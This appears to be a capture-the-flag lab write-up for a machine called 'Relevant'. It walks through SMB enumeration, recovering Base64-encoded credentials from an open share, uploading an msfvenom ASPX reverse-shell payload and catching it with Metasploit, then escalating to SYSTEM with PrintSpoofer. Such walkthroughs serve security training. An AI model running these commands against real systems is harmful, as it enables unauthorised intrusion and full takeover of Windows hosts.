# Relevant

I started by running an nmap scan.

We can see some ports open on the machine and also MSRDP. 

Running nmap —script vuln [ip_address] results in finding:

smb-vuln-ms17-010:

VULNERABLE - CVE-2017-0143

I tried to use Metasploit with the exploit 'windows/smb/ms17_010_eternalblue’, after running I get the message 'The target is not vulnerable’.

Using Metasploit lead nowhere for now. 

Since SMB is open I tried to look into that.

smbclient -L [ip_address]

This listed shares including ADMIN$, C$, IPC$ and an interesting name share nt4wrksv. I connected to that share:

smbclient //[ip_address]/nt4wrksv

This showed a passwords.txt file that I downloaded from SMB.

By reading the file, we see 2 lines of encrypted text, likely encrypted in Base64 given the suffix "==”. After decrypting the text, we see two users Bob and Bill with their respective passwords. 

I tried to RDP with these credentials, but I got nothing.

After doing some research, I found that I need to exploit the vulnerability I found earlier CVE-2017-0143. So I need to create an aspx payload using msfvenom. 

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.129.128 LPORT=1234 -f aspx > exploit.aspx

Next, I uploaded the generated exploit to the SMB share (same nt4wrksv share) using smbclient:

smbclient //[ip_address]/nt4wrksv 

After the upload, I started Metasploit to catch the meterpreter session. 

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST [ip_address]

set LPORT 1234

run

Then I needed to trigger the uploaded ASPX exploit by requesting it (browser or curl)

curl http://10.80.143.140:49663/nt4wrksv/exploit.aspx

After running this command, I got the meterpreter shell in Metasploit. 

To get the user.txt file I used search -f user.txt to find the file on the system and read the flag.

### Post-exploitation

I ran getuid and getprivs to see what privileges do I have on the machine. 

Out of the results from getprivs, SeImpersonatePrivilege stood out. A widely used tool for this on Windows is PrintSpoofer, which leverages that privilege to spawn a SYSTEM shell.

I got the exploit on my machine:

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

After that I needed to put the file on the smb share.

In meterpreter I dropped to a Windows shell and navigate to the web directory where I uploaded the binary:

cd c:\inetpub\wwwroot\nt4wrksv

I then executed the PrintSpoofer to spawn a SYSTEM process (it spawns powershell.exe as SYSTEM in this example)

PrintSpoofer64.exe -i -c powershell.exe

With the system privileges I navigate to c:\Users\Administrator\Desktop and read the root.txt file to get the root flag.